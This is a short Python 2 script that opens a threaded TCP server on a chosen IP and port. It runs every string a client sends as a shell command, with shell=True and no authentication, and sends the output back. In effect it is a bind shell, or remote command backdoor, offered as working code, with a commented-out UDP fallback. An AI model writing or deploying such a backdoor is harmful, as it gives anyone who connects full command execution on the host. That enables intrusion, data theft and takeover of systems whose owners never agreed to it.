# -*- coding:utf-8 -*-
import os
import sys
import subprocess
import SocketServer

class Tcp_socket(SocketServer.BaseRequestHandler):
    def handle(self):
        conn = self.request
        conn.send(bytes("connect success !"))
        while True:
            try:
                get_bytes = conn.recv(1024)
                get_info = str(get_bytes)
                if get_info == "q":
                    break
                else:
                    try:
                        command = subprocess.check_output(get_bytes,stderr=subprocess.STDOUT,shell=True,universal_newlines=True)
                        command_info = conn.send(bytes(command))
                    except:
                        return command
                    # try:
                    #     command = os.popen(get_bytes).read()
                    #     command_info = conn.send(bytes(command))
                    # except Exception,e:
                    #     command = os.popen(get_bytes).read()
                    #     command_info = conn.send(bytes(command))                     
            except Exception,e:
                print e
        

if __name__ == "__main__":
    socket_ip = sys.argv[1]
    socket_port = sys.argv[2]
    try:
        Tcp_server = SocketServer.ThreadingTCPServer((str(socket_ip),int(socket_port)),Tcp_socket)
        Tcp_server.serve_forever()
    except Exception,e:
        print e
        # print "Try create Udp!"
        # try:
        #     create_udpsocket = SocketServer.ThreadingUDPServer((socket_ip,socket_port),udp_server)
        #     create_udpsocket.serve_forever()
        # except Exception,e:
        #     print e       